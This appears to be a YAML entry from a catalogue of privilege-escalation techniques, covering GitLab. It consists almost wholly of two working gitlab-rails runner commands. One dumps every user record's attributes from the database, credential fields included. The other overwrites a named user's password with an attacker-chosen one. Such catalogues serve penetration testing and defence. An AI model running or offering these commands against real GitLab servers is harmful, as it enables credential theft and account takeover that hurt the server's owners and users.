---
functions:
  privilege-escalation:
    - description: Simple Gitlab Privesc Technique
      code: |
        Dump the Database:
        gitlab-rails runner 'User.where.not(username: "peasssssssss").each { |u| pp u.attributes }'

        Change Passwords:
        gitlab-rails runner 'user = User.find_by(username: "dude"); user.password = "adminpassword"; user.password_confirmation = "adminpassword"; user.save!'
---
